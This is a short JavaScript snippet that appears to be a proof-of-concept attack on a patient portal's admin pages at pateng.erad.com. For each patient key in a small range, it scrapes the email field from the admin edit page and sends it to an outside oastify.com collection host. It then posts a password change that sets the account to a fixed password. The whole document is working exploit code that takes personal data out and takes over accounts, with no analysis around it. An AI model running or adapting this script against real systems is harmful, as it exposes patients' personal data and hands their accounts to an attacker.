for (let i = 199234; i <= 199235; i++) {
  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
    .then(res => res.text())
    .then(res => {
      let match = res.match(/<input type="checkbox" name="emails"([\s\S]*?)<\/label>/);
      if (match) {
        fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(match[1])}`);
      }
      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
      });
    });
}
